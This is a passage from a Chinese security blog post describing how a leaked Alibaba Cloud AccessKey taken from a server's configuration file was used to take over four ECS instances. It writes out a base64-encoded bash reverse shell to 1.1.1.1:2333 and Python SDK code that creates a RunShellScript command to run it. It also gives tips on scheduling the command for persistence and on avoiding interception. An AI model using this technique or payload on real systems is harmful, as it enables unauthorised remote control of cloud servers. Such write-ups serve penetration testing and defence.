AccessKeySecret对称加密的方法来验证某个请求的发送者身份。</p><p>AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。</p><p><strong>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限</strong></p><p>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p><p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p><p><a href="https://help.aliyun.com/document_detail/31867.html?spm=a2c4g.11186623.2.7.60c35869TaDn9K#concept-e4s-mhv-tdb">详细介绍</a></p><h2 id=0x03-通过access-token接管ecs>0x03 通过Access Token接管ECS</h2><p>ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。</p><p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p><p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p><p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p><pre tabindex=0><code>Access Key Id : *********
+Access Secret : ***************************
+Region : cn-*****
+</code></pre><p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p><p>DescribeInstances - 获得实例信息</p><p><img src=https://images.payloads.online/5f4963fc-4f5f-11ec-9a56-00d861bf4abb.png alt=2019-04-02-21-11-05></p><p>只有第一个<code>RegionId</code>是必填项，点击<code>API Explorer</code>，可以直接进入调试环境：</p><p><img src=https://images.payloads.online/5f9a2274-4f5f-11ec-8f74-00d861bf4abb.png alt=2019-04-02-21-12-38></p><p>服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p><p>我是直接在<code>Alicloud Shell</code>里复制了一份运行的：</p><p><img src=https://images.payloads.online/5fe32866-4f5f-11ec-8225-00d861bf4abb.png alt=2019-04-02-21-16-55></p><p>输出结果如下：</p><p><img src=https://images.payloads.online/60291bd2-4f5f-11ec-88bc-00d861bf4abb.png alt=2019-04-02-21-21-17></p><p>使用<code>json.cn</code>格式化一下：</p><p><img src=https://images.payloads.online/607ec69a-4f5f-11ec-a155-00d861bf4abb.png alt=2019-04-02-21-23-48></p><p>共四台服务器，那么如何执行命令呢？</p><p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p><p><a href=https://help.aliyun.com/document_detail/64844.html>https://help.aliyun.com/document_detail/64844.html</a></p><p>命令的类型取值范围：</p><ul><li>RunBatScript：创建一个在 Windows 实例中运行的 Bat 脚本</li><li>RunPowerShellScript：创建一个在 Windows 实例中运行的 PowerShell 脚本</li><li>RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本</li></ul><p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p><pre tabindex=0><code>rvn0xsy@Rvn0xsy ~&gt; echo &#34;bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1&#34; | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
+</code></pre><p><img src=https://images.payloads.online/60c11202-4f5f-11ec-ac1c-00d861bf4abb.png alt=2019-04-02-21-29-22></p><pre tabindex=0><code>#!/usr/bin/env python
+#coding=utf-8
+
+from aliyunsdkcore.client import AcsClient
+from aliyunsdkcore.acs_exception.exceptions import ClientException
+from aliyunsdkcore.acs_exception.exceptions import ServerException
+from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest
+
+client = AcsClient(&#39;&lt;accessKeyId&gt;&#39;, &#39;&lt;accessSecret&gt;&#39;, &#39;cn-shanghai&#39;)
+
+request = CreateCommandRequest()
+request.set_accept_format(&#39;json&#39;)
+
+request.set_Type(&#34;RunShellScript&#34;)
+request.set_CommandContent(&#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&#34;)
+request.set_Name(&#34;test&#34;)
+
+response = client.do_action_with_exception(request)
+# python2:  print(response) 
+print(str(response, encoding=&#39;utf-8&#39;))
+</code></pre><p>执行成功后，会返回如下信息：</p><pre tabindex=0><code>{
+	&#34;RequestId&#34;: &#34;********-****-****-****-********&#34;,
+	&#34;CommandId&#34;: &#34;c-0************&#34;
+}
+</code></pre><p>CommandId最好记下来，不然还要调用<a href="https://api.aliyun.com/find/Ecs/DescribeCommands?spm=a2c1g.8271268.10000.91.169bdf25hVPFbi">DescribeCommands</a></p><pre tabindex=0><code>{
+	&#34;PageNumber&#34;: 1,
+	&#34;TotalCount&#34;: 1,
+	&#34;PageSize&#34;: 10,
+	&#34;RequestId&#34;: &#34;********-****-****-****-********&#34;,
+	&#34;Commands&#34;: {
+		&#34;Command&#34;: [
+			{
+				&#34;Name&#34;: &#34;test&#34;,
+				&#34;Timeout&#34;: 3600,
+				&#34;CommandContent&#34;: &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=&#34;,
+				&#34;Description&#34;: &#34;&#34;,
+				&#34;Type&#34;: &#34;RunShellScript&#34;,
+				&#34;CommandId&#34;: &#34;c-0************&#34;,
+				&#34;WorkingDir&#34;: &#34;&#34;
+			}
+		]
+	}
+}
+</code></pre><p>紧接着就是<code>InvokeCommand</code>：</p><ul><li>RegionId：区域ID，例如：cn-shanghai</li><li>CommandId：命令ID</li><li>InstanceId：实例ID</li><li>Timed：命令是否为周期执行。 默认值：False</li><li>Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于10秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅<a href="https://help.aliyun.com/document_detail/64769.html?spm=a2c4g.11186623.2.21.755e1926kBOlWA">Cron表达式</a>。</li></ul><p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。</p><p><img src=https://images.payloads.online/6109210a-4f5f-11ec-85d9-00d861bf4abb.png alt=2019-04-02-21-39-17></p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2019-04-02/2/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>BaseRequestHandler 传参问题</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2019-03-16/1/><span>OWASP - 吉林沙龙</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
